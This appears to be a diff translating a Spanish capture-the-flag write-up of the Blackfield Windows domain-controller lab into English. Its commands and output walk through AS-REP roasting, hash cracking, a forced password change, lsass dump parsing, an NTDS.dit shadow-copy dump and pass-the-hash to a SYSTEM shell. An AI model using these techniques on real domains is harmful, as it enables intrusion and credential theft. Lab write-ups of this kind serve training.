@@ -2,7 +2,7 @@
 
 # Enumeration
 
->Comenzamos con un escaneo de puertos empleando el script de escaneo automático de puertos TCP creado por mí:
+>We start with a port scan using the automatic TCP port scan script created by me:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -29,7 +29,7 @@ Puertos TCP abiertos:
 |_  start_date: N/A
 ```
 
->Enumeramos la versión de Windows y el nombre del dominio mediante la herramienta crackmapexec:
+>We list the Windows version and domain name using the crackmapexec tool:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -38,14 +38,14 @@ SMB         10.129.24.124   445    DC01             [*] Windows 10 / Server 2019
 
 ```
 
->Agregamos el dominio encontrado al /etc/hosts para que el equipo pueda resolver el nombre de dominio empleando el resolutor local:
+>We added the found domain to the /etc/hosts so that the computer can resolve the domain name using the local resolver:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
 └─$ echo '10.129.24.124 blackfield.local' >> /etc/hosts  
 ```
 
->Al tratar de iniciar de forma anónima en el RPC vemos que no tenemos acceso:
+>When trying to start anonymously in the RPC we see that we do not have access to:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -55,7 +55,7 @@ result was NT_STATUS_ACCESS_DENIED
 
 ```
 
->Si enumeramos los recursos compartidos por SMB mediante login anónimo podemos ver los siguientes:
+>If we list the resources shared by SMB through anonymous login we can see the following:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -73,7 +73,7 @@ Password for [WORKGROUP\]:
         SYSVOL          Disk      Logon server share
 ```
 
->Si nos conectamos al share profiles$ podemos ver que hay directorios que parecen ser personales de cuentas del dominio por lo que vamos a llevarnos los nombres de todas las carpetas:
+>If we connect to the share `profiles$` we can see that there are directories that seem to be personal to domain accounts so we are going to take the names of all the folders:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -98,14 +98,14 @@ smb: \> ls
   <SNIP>
 ```
 
-> Vamos a tratar el texto para quedarnos solo con los usuarios:
+> We are going to treat the text to stay only with the users:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
 └─$ cat users | awk '{print $1}' FS=" " > valid_users
 ```
 
-> Vamos a enumerar con kerbrute los usuarios válidos en el dominio:
+> Let's list with kerbrute the valid users in the domain:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
@@ -131,14 +131,14 @@ Version: dev (n/a) - 04/09/25 - Ronnie Flathers @ropnop
 <SNIP>
 ```
 
->Vamos a agregar los usuarios válidos a una lista:
+>Let's add the valid users to a list:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
 └─$ echo -e "audit2020\nsupport\nsvc_backup" > domain_users
 ```
 
-> Si probamos a buscar usuarios que no requieran preautenticación de kerberos (usuarios vulnerables a ASREP-ROAST) vemos que el usuario support es vulnerable y nos dió su Hash ASREP de tipo 23 que crackearemos offline:
+> If we try to find users that do not require kerberos pre-authentication (users vulnerable to ASREP-ROAST) we see that the `support` user is vulnerable and gave us their ASREP type 23 Hash that we will crack offline:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
@@ -150,7 +150,7 @@ $krb5asrep$23$support@BLACKFIELD.LOCAL:173d8f589eacbb88ef4af1737319046b$edbf2bd1
 [-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
 
->Vamos a crackear offline el hash con la herramienta hashcat emplendo la máscara 18200 que corresponde a los hashes ASREP de tipo 23 (`$krb5asrep$23$`) y podemos ver su contraseña:
+>We are going to crack the hash offline with the hashcat tool by using the 18200 mask that corresponds to the ASREP type 23 hashes (`$krb5asrep$23$`) and we can see its password:
  
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
@@ -162,7 +162,7 @@ hashcat (v6.2.6) starting
 $krb5asrep$23$support@BLACKFIELD.LOCAL:173d8f589eacbb88ef4af1737319046b$edbf2bd162d53fbc0cd78a904899b905cfca1259df963df2c8a507901d01159815d57f4c6521f13f902365a6479ce95436734d28849abb25c8deef2123ee3dd2ed6047afe1ab402d3f27aa51cab2d9f37b12ad9a6251d1cdaadc93028b67309e17b3e0e158b6d0bc1c633dd9818a0abaec189b8c599cee0b361fc7bbf5949d012f41d124b89e20913f9177ec39c3541ebeb9b06ce022c01fa13a7c5afb74f625f2246a4ef4c5175824badc95e4e9a3879c1d054e63115d4c387a38c2cfd0b0f2fea32c681aa28b2b8624318c493382bdf3a6eac27d3bd0806aecc78d1ca9d3de57466f9ac0ea3b8851793a49637b77834cb8a4e4:#00^BlackKnight
 ```
 
->Vamos a verificar si las credenciales son válidas empleando crackmapexec y vemos que lo son:
+>Let's check if the credentials are valid using crackmapexec and we see that they are:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
@@ -171,7 +171,7 @@ SMB         10.129.24.124   445    DC01             [*] Windows 10 / Server 2019
 SMB         10.129.24.124   445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight
 ```
 
->Podemos ver que no hay ningún usuario Kerberoasteable:
+>We can see that there is no Kerberoasteable user:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
@@ -181,7 +181,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 No entries found!
 ```
 
->Vamos a dumpear el dominio mediante LDAP para ver más información acerca de los usuarios, grupos y relaciones de confianza y lanzar un servidor http para ver el contenido de los archivos generados al dumpearlo:
+>We are going to dump the domain using LDAP to see more information about users, groups and trusted relationships and launch an http server to see the content of the files generated by dumping it:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
@@ -197,11 +197,11 @@ No entries found!
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
->Aquí podemos ver que el usuario que hemos comprometido no pertenece a ningún grupo interesante, en cambio, el usuario svc_backup pertenece a los grupos Remote Management Users y Backup Operators que son grupos muy privilegiados que podemos abusar.
+>Here we can see that the user we have committed does not belong to any interesting group, instead, the ``svc_backup`` user belongs to the ``Remote Management Users`` and ``Backup Operators`` groups which are very privileged that we can abuse.
 
 # Privilege Escalation
 
->Ahora, ejecutaremos bloodhound-python para obtener datos que analizar en BloodHound del dominio para ver por donde podríamos escalar privilegios:
+>Now, we'll run bloodhound-python to get data to analyze in BloodHound of the domain to see where we could escalate privileges:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
@@ -227,7 +227,7 @@ INFO: Querying computer: DC01.BLACKFIELD.local
 INFO: Done in 00M 14S
 ```
 
->Vamos a comprimir los archivos resultantes del comando anterior en un zip para facilitar el importado a BloodHound:
+>Let’s compress the files generated by the previous command into a zip file to make it easier to import them into BloodHound:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
@@ -241,7 +241,7 @@ INFO: Done in 00M 14S
   adding: 20250409131603_users.json (deflated 97%)
 ```
 
->Ahora iniciamos el servicio de Neo4j, la base de datos que emplea bloodhound:
+>We will now start the Neo4j service, the database used by Bloodhound:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
@@ -261,7 +261,7 @@ Started neo4j (pid:111770). It is available at http://localhost:7474
 There may be a short delay until the server is ready.
 ```
 
->Abrimos bloodhound de forma gráfica, nos logueamos con las credenciales de Neo4j e importamos el archivo zip, si da error de formato JSON, importar el zip arrastrándolo desde una carpeta a la aplicación:
+>Open Bloodhound via the graphical interface, log in using your Neo4j credentials and import the ZIP file; if you get a JSON format error, import the ZIP file by dragging it from a folder into the application:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
@@ -269,12 +269,12 @@ There may be a short delay until the server is ready.
 [1] 112047
 ```
 
->Aquí podemos ver una oportunidad para movernos lateralmente hacia la cuenta audit2020 ya que poseemos permisos de ForceChangePassword sobre dicha cuenta:
+>Here we can see an opportunity to move laterally to the ``audit2020`` account, as we have ``ForceChangePassword`` permissions on that account:
 
 ![image](https://github.com/user-attachments/assets/8767dd5f-543b-4397-b76a-2ffa8a442ee7)
 
 
->Vamos a emplear una herramienta de la suite de Impacket para cambiar la contraseña del usuario audit2020 aprovechando estos privilegios:
+>We are going to use a tool from the Impacket suite to change the password of the user ``audit2020``, taking advantage of these privileges:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
@@ -287,7 +287,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [!] User no longer has valid AES keys for Kerberos, until they change their password again.
 ```
 
->Vamos a probar si se cambiaron las credenciales de verdad y efectivamente, hemos obtenido acceso a otro usuario del dominio:
+>Let's check whether the credentials have actually been changed and whether we've successfully gained access to another user on the domain:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
@@ -296,7 +296,7 @@ SMB         10.129.24.124   445    DC01             [*] Windows 10 / Server 2019
 SMB         10.129.24.124   445    DC01             [+] BLACKFIELD.local\audit2020:Password123$!
 ```
 
->Si listamos las shares de este usuario vemos una interesante llamada forensic:
+>If we list this user's shares, we see an interesting one called ``forensic``:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
@@ -315,7 +315,7 @@ SMB         10.129.24.124   445    DC01             profiles$       READ
 SMB         10.129.24.124   445    DC01             SYSVOL          READ            Logon server share 
 ```
 
->Nos conectamos al recurso compartido:
+>We connect to the shared resource:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
@@ -332,7 +332,7 @@ smb: \> ls
                 5102079 blocks of size 4096. 1693221 blocks available
 ```
 
->Aquí en un directorio podemos ver un archivo muy importante llamado lsass.zip el cual corresponde a un minidump del proceso lsass.exe el cual contiene contraseñas de usuarios del sistema:
+>Here, in a directory, we can see a very important file called lsass.zip, which is a minidump of the lsass.exe process and contains the system users' passwords:
 
 ```bash
 smb: \memory_analysis\> ls
@@ -359,7 +359,7 @@ smb: \memory_analysis\> ls
 
 ```
 
->Descargamos el archivo en nuestra máquina atacante:
+>We download the file onto our attacker's machine:
 
 ```bash
 smb: \memory_analysis\> get lsass.zip
@@ -367,7 +367,7 @@ getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip (4793.2 Ki
 
 ```
 
->Descomprimimos el archivo:
+>Unzip the file:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
@@ -376,7 +376,7 @@ Archive:  lsass.zip
   inflating: lsass.DMP    
 ```
 
->Vamos a emplear la herramienta pypykatz para extraer hashes del minidump:
+>We're going to use the pypykatz tool to extract hashes from the minidump:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
@@ -415,7 +415,7 @@ luid 406458
 <SNIP>
 ```
 
->Vamos a comprobar si podemos hacer un PassTheHash como el usuario svc_backup empleando su hash NT y vemos que es válido:
+>Let's check if we can perform a PassTheHash attack as the user ``svc_backup`` using their NT hash and see if it's valid:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
@@ -424,7 +424,7 @@ SMB         10.129.24.124   445    DC01             [*] Windows 10 / Server 2019
 SMB         10.129.24.124   445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d
 ```
 
->Como podemos recordar, cuando dumpeamos el LDAP pudimos ver que esta cuenta pertenecía al grupo Remote Management Users, por lo que podemos conectarnos al DC mediante evil-winrm realizando un PassTheHash, donde podremos ver la flag user.txt:
+>As we may recall, when we dumped the LDAP, we could see that this account belonged to the ``Remote Management Users`` group, so we can connect to the DC using evil-winrm by performing a PassTheHash, where we will be able to see the user.txt flag:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
@@ -448,7 +448,7 @@ Mode                LastWriteTime         Length Name
 -a----        2/28/2020   2:26 PM             32 user.txt
 ```
 
-> Recordemos que este usuario pertenece también a otro grupo privilegiado llamado Backup Operators, el cual podemos abusar para escalar privilegios:
+>Let's remember that this user also belongs to another privileged group called ``Backup Operators``, which we can exploit to escalate privileges:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> net user svc_backup
@@ -461,7 +461,7 @@ Global Group memberships     *Domain Users
 The command completed successfully.
 ```
 
->Al pertenecer a este grupo podemos ver que tenemos el privilegio SeBackupPrivilege:
+>As members of this group, we can see that we have the ``SeBackupPrivilege`` privilege:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv
@@ -479,14 +479,14 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
->Este permiso puede ser abusado para hacer una shadow copy del archivo NTDS.dit del DC el cual contiene los hashes de todos los usuarios del dominio, para ello, empezaremos realizando la shadow copy, para ello emplearemos las 2 herramientas alojadas en el siguiente repositorio https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug :
+>This permission can be exploited to create a shadow copy of the NTDS.dit file on the DC, which contains the hashes of all users in the domain. To do this, we will start by creating the shadow copy, using the two tools hosted in the following repository https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug :
 
 ```powershell
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> Import-Module .\SeBackupPrivilegeUtils.dll
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> Import-Module .\SeBackupPrivilegeCmdLets.dll
 ```
 
->Previamente, deberemos crear un archivo txt con las siguientes instrucciones y pasarlos a la máquina para crear la shadow copy con la herramienta diskshadow de Windows, dejando un espacio en blanco al final de cada línea para evitar fallos:
+>First, we need to create a text file containing the following instructions and transfer them to the machine to create the shadow copy using the Windows ``diskshadow`` tool, leaving a blank space at the end of each line to prevent errors:
 
 ```bash
 set verbose on 
@@ -501,7 +501,7 @@ end backup
 exit 
 ```
 
->Ahora ejecutamos diskshadow.exe con las instrucciones del archivo txt:
+>Now we run diskshadow.exe following the instructions in the txt file:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow.exe /s diskshadow.txt
@@ -590,20 +590,20 @@ The shadow copy was successfully exposed as E:\.
 
 ```
 
-> Ahora vamos a hacer una copia de la hive del registro SYSTEM para poder dumpear los hashes del NTDS y lo pasamos a nuestra máquina atacante:
+>Now we're going to make a copy of the SYSTEM registry hive so that we can dump the NTDs hashes and transfer them to our attacker machine:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save HKLM\SYSTEM C:\Users\svc_backup\Documents\SYSTEM.sav
 The operation completed successfully.
 ```
 
->Ahora nos copiamos el archivo NTDS.dit a otro directorio aprovechando el privilegio anteriormente mencionado, bypasseando las ACL del archivo que evitarían su copiado:
+>We now copy the NTDs.dit file to another directory, exploiting the privilege mentioned earlier, thereby bypassing the file's ACLs that would otherwise prevent it from being copied:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Users\svc_backup\documents\ntds.dit
 ```
 
->Una vez teniendo el ntds.dit y el system.sav podemos realizar un dumpeo de los hashes de todo el dominio de la siguiente forma:
+>Once we have the ntds.dit and system.sav files, we can dump the hashes for the entire domain as follows:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
@@ -623,7 +623,7 @@ audit2020:1103:aad3b435b51404eeaad3b435b51404ee:e0a8687b8eb33a0913ab69cb0042bfde
 <SNIP>
 ```
 
->Ahora teniendo el hash del usuario Administrador podemos hacer un PassTheHash que nos de una shell como SYSTEM en el DC, donde encontraremos la flag root.txt:
+>Now that we have the Administrator user's hash, we can perform a PassTheHash attack to gain a SYSTEM-level shell on the DC, where we will find the root.txt flag:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/blackfield]
